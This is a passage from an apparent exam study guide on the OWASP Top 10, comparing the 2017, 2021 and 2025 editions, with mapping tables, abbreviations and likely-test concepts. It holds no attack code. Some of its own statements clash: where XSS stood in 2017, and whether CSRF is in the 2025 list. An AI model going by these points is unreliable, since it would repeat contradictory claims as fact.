| XML External Entities (XXE) — A4:2017 | 2021 | A05:2021 Security Misconfiguration | XXE is a misconfiguration of XML parsers — root cause is config, not a standalone vuln class |
| Cross-Site Scripting (XSS) — A7:2017 | 2021 | A03:2021 Injection | XSS is a form of injection — untrusted data in output context interpreted as code |
| Insecure Deserialization — A8:2017 | 2021 | A08:2021 Software & Data Integrity Failures | Deserialization of untrusted data is an integrity failure |
| SSRF — A10:2021 | 2025 | A01:2025 Broken Access Control | SSRF is fundamentally an access control failure — server makes requests the user shouldn't be able to trigger |
| CSRF — (removed in 2017 from 2013 list) | 2017 | Not in Top 10 (2017, 2021, 2025) | Modern frameworks include CSRF protection by default; SameSite cookies help; risk reduced |
| Unvalidated Redirects & Forwards — (2013) | 2017 | Not in Top 10 (2017, 2021, 2025) | Incidence rate declined; partially absorbed into Access Control |

---

### 4.6 What's New in 2025

> [!NOTE]
> Two brand-new categories in 2025. Both are heavily testable because they represent conceptual shifts in what OWASP considers top risks.

**New Category 1: A03:2025 — Software Supply Chain Failures**
- Replaces/expands A09:2021 "Vulnerable and Outdated Components"
- Scope expanded from "outdated dependencies" to the entire software supply chain
- Motivated by: SolarWinds (2020), XZ Utils (2024), dependency confusion attacks, typosquatting
- Requires SBOM, signed packages, dependency verification, supply chain scanning beyond traditional SCA

**New Category 2: A10:2025 — Mishandling of Exceptional Conditions**
- Entirely new concept — no direct 2021 predecessor
- Replaces the slot vacated by SSRF (absorbed into A01)
- Focuses on: error handling, fail-open scenarios, race conditions, TOCTOU bugs, uncaught exceptions
- Motivated by: increasing complexity of distributed systems, microservices, serverless architectures where failure modes multiply
- Represents a shift toward **resilience as a security property**

---

### 4.7 Why Each Change Happened — Root Cause Analysis

> [!NOTE]
> Exam questions often ask "why did X move" or "what drove the introduction of Y." Know the reasoning, not just the positions.

| Change | Root Cause / Driving Factor |
|---|---|
| Security Misconfiguration jumped to #2 | Cloud adoption explosion — every cloud deployment has config, config drifts, defaults are insecure, IAM policies sprawl |
| Supply Chain rose to #3 | Nation-state and criminal exploitation of software supply chain (SolarWinds, XZ Utils, npm attack campaigns) |
| Injection fell to #5 | Developer education working — parameterized queries now standard; ORM adoption widespread; SQLi incidence rate down |
| SSRF absorbed into A01 | Root-cause analysis — SSRF is an access control failure; separate categorization obscured this |
| Exceptional Conditions added as A10 | Distributed systems, microservices, serverless = exponentially more failure modes; resilience became a named security concern |
| XSS merged into Injection (2021, retained 2025) | Conceptual alignment — XSS is injection of script into an output context; same root cause as SQLi |
| XXE merged into Misconfiguration (2021, retained 2025) | XXE happens when XML external entity processing is misconfigured (not disabled) — a configuration failure |
| Insecure Design added in 2021 | Growing recognition that implementation-level fixes (patching) are insufficient for design-level flaws; shift-left security movement |

---

### 4.8 OWASP Methodology — How the List is Scored

> [!NOTE]
> Understanding the methodology helps you answer MCQs about why a category appears or doesn't appear on the list.

**Data Sources:**
- Contributed datasets from security vendors, consultancies, bug bounty platforms
- Direct submissions from organizations
- HaT (Human-assisted Tooling) and TaH (Tooling-assisted Human) data kept separate

**Two Inputs:**
1. **Quantitative data** — CWE scan analysis; incidence rate across applications in the dataset
2. **Qualitative survey** — community practitioner survey fills gaps where tooling data underrepresents real-world impact

**Why the survey matters:** Data looks at the past (what tools have found). Practitioners see emerging threats before they're measurable. Survey allows up to 2 categories to enter based on community judgment even if not yet in the quantitative top 10.

**Scoring formula factors:**
- Incidence rate (how many apps have the issue) — not raw frequency
- Number of CVEs mapped
- CWE coverage per category
- Expert weighting from survey

---

### 4.9 OWASP Top 10 vs Compliance Standards

> [!NOTE]
> MCQs may ask whether OWASP Top 10 compliance equals regulatory compliance. The answer is **no** — but it is referenced as evidence.

| Standard | Relationship to OWASP Top 10 |
|---|---|
| **PCI DSS 4.0** | Requirement 6.2.4 explicitly references OWASP Top 10 as acceptable evidence of secure coding practices |
| **SOC 2** | Secure development criteria references OWASP Top 10 coverage |
| **HIPAA** | Technical safeguards reference OWASP-aligned controls |
| **ISO 27001** | No direct mention, but A.14 (System Acquisition) aligns with OWASP Top 10 topics |
| **NIST SP 800-53** | SA-11 (Developer Security Testing) and SA-15 (Development Process) align with Top 10 categories |

> [!IMPORTANT]
> OWASP Top 10 is a **foundational layer**, not a complete control set. Compliance with PCI DSS, SOC 2, or HIPAA requires far more than addressing the Top 10.

---

### 4.10 CWE Mapping Stats Across Versions

> [!NOTE]
> These numbers come up in MCQs about OWASP methodology and the rigor of each edition.

| Version | CWEs Analyzed | CWEs Mapped | CVE Records | Categories |
|---|---|---|---|---|
| 2017 | ~400 | ~40 per category (est.) | Not published | 10 |
| 2021 | ~400 | 218 total | Not explicitly stated | 10 |
| 2025 | **589** | **248 total** | **175,000+** | 10 |

- A01:2025 (Broken Access Control) = **40 CWEs** — largest single category
- CWE count increase from 2021 to 2025 = **+30 CWEs** (218 → 248)
- CWEs analyzed increase = **+189** (400 → 589)

---

### 4.11 Update History — All Versions

> [!NOTE]
> MCQs sometimes test OWASP history — when it was founded, when each version released, update cadence.

| Year | Version | Key Notes |
|---|---|---|
| 2003 | OWASP Top 10 v1 | First release |
| 2004 | OWASP Top 10 2004 | Second release |
| 2007 | OWASP Top 10 2007 | Third release |
| 2010 | OWASP Top 10 2010 | Fourth release |
| 2013 | OWASP Top 10 2013 | Fifth release; predecessor to 2017 |
| **2017** | **OWASP Top 10 2017** | XXE, Insecure Deserialization, Logging added; XSS dropped from standalone |
| **2021** | **OWASP Top 10 2021** | Major restructure; Insecure Design + SDIF + SSRF added; XSS merged; XXE merged |
| **2025** | **OWASP Top 10 2025** | Supply Chain + Exceptional Conditions added; SSRF absorbed; Misconfiguration to #2 |

**Update cadence:** OWASP targets **3–4 year release cycles** — deliberately balancing stability with relevance.

> [!NOTE]
> OWASP was founded in **2001** by Mark Curphey. The Top 10 project started in **2003**. The organization became a US 501(c)(3) non-profit in **2004**.

---

## 5. Abbreviations Table

| Abbreviation | Full Form | Technical Meaning |
|---|---|---|
| OWASP | Open Web Application Security Project | Non-profit producing open security standards, tools, and documentation for web application security |
| CWE | Common Weakness Enumeration | MITRE's catalog of software weakness types — root cause classifications used to map OWASP categories |
| CVE | Common Vulnerabilities and Exposures | MITRE's unique identifiers for publicly known specific vulnerability instances |
| SSRF | Server-Side Request Forgery | Server is coerced into making HTTP requests to internal or unauthorized external resources on behalf of attacker |
| CSRF | Cross-Site Request Forgery | Attacker tricks authenticated user's browser into sending unauthorized requests to a web application |
| XSS | Cross-Site Scripting | Malicious scripts injected into web pages and executed in victim's browser |
| SQLi | SQL Injection | SQL code injected into a database query via user input to manipulate or extract data |
| XXE | XML External Entity | Malicious XML input referencing external entities to access files, perform SSRF, or cause DoS |
| IDOR | Insecure Direct Object Reference | Direct access to objects (records, files) via user-controlled parameters without authorization checks |
| SSTI | Server-Side Template Injection | Injecting template syntax into server-side template engines (Jinja2, Twig) resulting in RCE |
| RCE | Remote Code Execution | Attacker executes arbitrary code on the target server |
| SBOM | Software Bill of Materials | Formal inventory of all software components, their versions, and dependencies |
| SCA | Software Composition Analysis | Automated scanning of third-party dependencies for known vulnerabilities |
| SAST | Static Application Security Testing | Analysis of source code or binaries without execution to find vulnerabilities |
| DAST | Dynamic Application Security Testing | Testing of running application by simulating attacks from outside |
| IAST | Interactive Application Security Testing | Security testing instrumented within the running application during testing |
| MFA | Multi-Factor Authentication | Authentication using two or more independent factors (knowledge, possession, inherence) |
| JWT | JSON Web Token | Compact, URL-safe token format for transmitting claims — commonly used for session/auth tokens |
| HSTS | HTTP Strict Transport Security | HTTP response header forcing browser to use HTTPS only for the domain |
| CSP | Content Security Policy | HTTP header restricting sources of scripts, styles, and other resources to prevent XSS |
| IAM | Identity and Access Management | Framework of policies and technologies controlling user access to resources |
| SIEM | Security Information and Event Management | Platform aggregating and correlating security logs and events; triggers alerts |
| TOCTOU | Time-of-Check Time-of-Use | Race condition where attacker changes state between a security check and the use of the checked value |
| SBOM | Software Bill of Materials | Formal inventory of all components in a software product for supply chain security |
| KDF | Key Derivation Function | Algorithm (bcrypt, Argon2) for converting passwords into strong cryptographic keys |
| PFS | Perfect Forward Secrecy | TLS property ensuring session keys cannot be derived from the long-term private key |
| ORM | Object-Relational Mapper | Framework abstracting database queries (Hibernate, SQLAlchemy) — parameterizes queries by default |
| CDN | Content Delivery Network | Distributed server network delivering static assets — CDN-hosted JS is a supply chain risk if unverified |
| CRLF | Carriage Return Line Feed | `\r\n` characters — injection of these into HTTP headers splits responses or manipulates logs |
| IV | Initialization Vector | Random value used in block cipher encryption to ensure same plaintext produces different ciphertext |

---

## 6. Keywords + Concept Map

| Term | Definition | Connects To | Use Case / Context |
|---|---|---|---|
| **Broken Access Control** | Failure to enforce restrictions on what authenticated users can do | IDOR, SSRF, privilege escalation, path traversal | A01:2025 + A01:2021 — #1 risk |
| **SSRF** | Server makes unauthorized outbound requests on attacker's behalf | Cloud metadata theft, internal network scanning | Was A10:2021 → now absorbed into A01:2025 |
| **Security Misconfiguration** | Incorrect/default security settings exposing the system | XXE (absorbed), default credentials, cloud IAM | A02:2025 — jumped from #5 in 2021 |
| **Supply Chain Attack** | Compromising software through third-party components or build pipeline | SolarWinds, XZ Utils, dependency confusion, SBOM | A03:2025 — new; expanded from Vulnerable Components |
| **Cryptographic Failure** | Missing, weak, or incorrectly implemented cryptographic protection | MD5, SHA-1, no TLS, weak salting, hardcoded keys | A04:2025 (was Sensitive Data Exposure A3:2017) |
| **Injection** | Untrusted input executed as code by an interpreter | SQLi, XSS, SSTI, LDAP injection, command injection | A05:2025; XSS merged in from A7:2017 |
| **Insecure Design** | Architectural flaws that cannot be fixed by patching | Threat modeling, secure by design, paved roads | A06:2025; introduced in 2021 |
| **Authentication Failure** | Broken verification of user identity | Credential stuffing, session fixation, JWT attacks | A07:2025; was A2:2017 |
| **Integrity Failure** | Untrusted code/data processed without verification | Insecure deserialization, unsigned updates, CI/CD compromise | A08:2025 = A08:2021 — unchanged |
| **Logging Failure** | Insufficient logging/alerting preventing attack detection | SIEM, audit trail, Log4Shell | A09:2025 — "Monitoring" → "Alerting" rename |
| **Exceptional Conditions** | Poor handling of errors, failures, and edge cases | Fail-open, TOCTOU, uncaught exceptions | A10:2025 — brand new |
| **Incidence Rate** | % of apps with at least one instance of a vulnerability | OWASP methodology, ranking | Replaced frequency counting in 2021+ |
| **CWE** | Weakness type classification | CVE, OWASP mapping, SAST rules | Used to categorize root causes |
| **SBOM** | Inventory of all software components | SCA, supply chain security, dependency management | Required for A03:2025 countermeasures |
| **Fail Secure** | System denies access when an error occurs | A10:2025, access control | vs "Fail Open" which is the vulnerability |
| **PFS** | Session keys not derivable from long-term private key | TLS, A04:2025, cryptography | Prevents retroactive decryption after key compromise |

---

## 7. Quick Reference Cheatsheet

### 📊 OWASP Top 10 : 2025 at a Glance

| # | Category | Status vs 2021 | Key CWEs / Notes |
|---|---|---|---|
| A01 | Broken Access Control | ✅ Same position | 40 CWEs; absorbed SSRF; 100% of apps affected |
| A02 | Security Misconfiguration | ↑ Up from #5 | Includes XXE; biggest jump in 2025 |
| A03 | Software Supply Chain Failures | 🆕 New (expanded from A09:2021) | Replaces "Vulnerable and Outdated Components"; SBOM key |
| A04 | Cryptographic Failures | ↓ Down from #2 | Was "Sensitive Data Exposure" in 2017 |
| A05 | Injection | ↓ Down from #3 | XSS merged in 2021; includes SQLi, XSS, SSTI, LDAP |
| A06 | Insecure Design | ↓ Down from #4 | Introduced in 2021; design vs implementation flaw |
| A07 | Authentication Failures | ✅ Same position | Was "Broken Authentication" (A2:2017); JWT attacks, session fixation |
| A08 | Software or Data Integrity Failures | ✅ Same position + name | Insecure deserialization; CI/CD integrity; unchanged from 2021 |
| A09 | Security Logging and Alerting Failures | ✅ Same position | "Monitoring" → "Alerting" rename; SIEM integration |
| A10 | Mishandling of Exceptional Conditions | 🆕 New | Replaces SSRF slot; fail-open, TOCTOU, uncaught exceptions |

---

### 📊 Changes Summary: 2021 → 2025

| Type | Categories |
|---|---|
| **Unchanged (name + position)** | A01 Broken Access Control, A07 Authentication Failures, A08 Software/Data Integrity Failures, A09 Logging/Alerting Failures |
| **Moved up** | A02 Security Misconfiguration (5→2), A03 Supply Chain (9→3) |
| **Moved down** | A04 Cryptographic Failures (2→4), A05 Injection (3→5), A06 Insecure Design (4→6) |
| **Renamed only** | A09: "Monitoring" → "Alerting"; A07: "Broken" → "Failures"; A08: "and" → "or" |
| **New in 2025** | A03 Software Supply Chain Failures, A10 Mishandling of Exceptional Conditions |
| **Removed from 2025** | A10:2021 SSRF (absorbed into A01:2025) |

---

### 📊 Merges Across All Versions

| Category | Last Standalone Version | Merged Into | Year Merged |
|---|---|---|---|
| XML External Entities (XXE) | A4:2017 | A05:2021 Security Misconfiguration | 2021 |
| Cross-Site Scripting (XSS) | A7:2017 | A03:2021 Injection | 2021 |
| Insecure Deserialization | A8:2017 | A08:2021 Software & Data Integrity Failures | 2021 |
| Server-Side Request Forgery (SSRF) | A10:2021 | A01:2025 Broken Access Control | 2025 |

---

### 📊 Key Attack → Category Mapping (2025)

| Attack Type | OWASP 2025 Category |
|---|---|
| IDOR / Horizontal privilege escalation | A01 Broken Access Control |
| Vertical privilege escalation | A01 Broken Access Control |
| SSRF | A01 Broken Access Control |
| CSRF | A01 Broken Access Control |
| Path Traversal | A01 Broken Access Control |
| Default credentials left unchanged | A02 Security Misconfiguration |
| XXE | A02 Security Misconfiguration |
| Public S3 bucket | A02 Security Misconfiguration |
| SolarWinds-style build compromise | A03 Software Supply Chain Failures |
| Typosquatting / dependency confusion | A03 Software Supply Chain Failures |
| Weak password hashing (MD5) | A04 Cryptographic Failures |
| No HTTPS / cleartext transmission | A04 Cryptographic Failures |
| SQL Injection | A05 Injection |
| XSS (Reflected/Stored/DOM) | A05 Injection |
| Command Injection | A05 Injection |
| SSTI | A05 Injection |
| No threat modeling | A06 Insecure Design |
| Credential stuffing | A07 Authentication Failures |
| Session fixation | A07 Authentication Failures |
| JWT `alg:none` | A07 Authentication Failures |
| Insecure deserialization | A08 Software/Data Integrity Failures |
| Unsigned software updates | A08 Software/Data Integrity Failures |
| No breach detection | A09 Security Logging and Alerting Failures |
| Logging sensitive data | A09 Security Logging and Alerting Failures |
| Fail-open on authentication error | A10 Mishandling of Exceptional Conditions |
| TOCTOU race condition | A10 Mishandling of Exceptional Conditions |
| Stack trace exposed to user | A10 Mishandling of Exceptional Conditions |

---

### 📊 OWASP Top 10 — Dataset Comparison

| Metric | 2017 | 2021 | 2025 |
|---|---|---|---|
| CWEs Analyzed | ~400 | ~400 | **589** |
| CWEs Mapped | — | 218 | **248** |
| CVE Records | — | — | **175,000+** |
| New categories | 3 (XXE, Deser, Logging) | 3 (Insecure Design, SDIF, SSRF) | 2 (Supply Chain, Exceptional Conditions) |
| Removed/merged categories | 2 (CSRF, Unvalidated Redirects) | 3 (XXE, XSS, Deser standalone) | 1 (SSRF) |

---

## 8. Session Revision Snapshot

### 🎯 TL;DR — 5-Bullet Summary

1. **OWASP Top 10 2025 has 2 new categories** — Software Supply Chain Failures (A03, expanded from Vulnerable Components) and Mishandling of Exceptional Conditions (A10, brand new) — plus SSRF absorbed into A01.
2. **Broken Access Control is still #1** — 100% of tested applications had some form; absorbs SSRF in 2025; maps to 40 CWEs.
3. **Security Misconfiguration made the biggest jump** — from #5 in 2021 to **#2 in 2025** — driven by real-world cloud misconfiguration breaches (default credentials, public buckets, IAM sprawl).
4. **Injection fell to #5** — not because it's less dangerous, but because parameterized queries and ORMs have lowered its incidence rate; XSS remains merged into Injection since 2021.
5. **The 2025 edition is the most data-heavy OWASP release** — 589 CWEs analyzed, 175,000+ CVE records, 248 CWEs mapped across 10 categories.

---

### 📌 MCQ-Likely Concepts — Full List

| Concept | Why it's MCQ-relevant |
|---|---|
| A01:2025 absorbed SSRF | Position change trap — test if you know SSRF moved |
| A02:2025 jumped from #5 → #2 | Biggest single ranking move in 2025 — commonly tested |
| A03:2025 is NEW (not A09 renamed) | It expands A09:2021 but is officially a new category in 2025 |
| A08:2025 unchanged from A08:2021 | The "what didn't change" trap — name AND position same |
| A09 "Monitoring" → "Alerting" | One-word rename — classic MCQ trap |
| A07 "Broken" → "Failures" | Another one-word rename — name accuracy tested |
| XSS was merged into Injection in 2021 | "Which 2017 category no longer exists as standalone?" |
| XXE was merged into Misconfiguration in 2021 | Same type of question |
| SSRF was A10:2021 | Position of SSRF in 2021 — before absorption |
| Insecure Design was new in 2021 | "Which category was introduced in 2021?" |
| CSRF absorbed into A01:2025 | CWE-352 mapped to A01 now |
| 2025 analyzed 589 CWEs | Methodology detail |
| 248 CWEs mapped in 2025 (vs 218 in 2021) | Exact numbers tested |
| 175,000+ CVE records analyzed | 2025 dataset scale |
| A01 maps to 40 CWEs — largest | Category with most CWEs |
| OWASP update cadence = 3–4 years | History/methodology question |
| OWASP founded 2001; Top 10 started 2003 | Trivia but tested |
| PCI DSS 4.0 Req 6.2.4 references OWASP | Compliance relationship |
| Incidence rate vs frequency | Methodology change from 2021 |
| Fail secure vs fail open | A10:2025 core concept |
| TOCTOU = Time-of-Check Time-of-Use | A10:2025 attack pattern |
| SBOM formats: CycloneDX, SPDX | A03:2025 countermeasure detail |
| Argon2id preferred over bcrypt for passwords | A04:2025 countermeasure |
| JWT alg:none vulnerability | A07:2025 attack vector |
| SolarWinds = A03 / Supply Chain | Real-world example mapping |
| Heartland Payment = A05 / SQLi | Real-world example mapping |
| Equifax breach = Apache Struts deserialization = A08 | Real-world example mapping |
| Capital One = Misconfiguration + Access Control | A01 + A02 combined |
| Log4Shell = A09 (ironic — logging library attacked) | Real-world A09 example |

---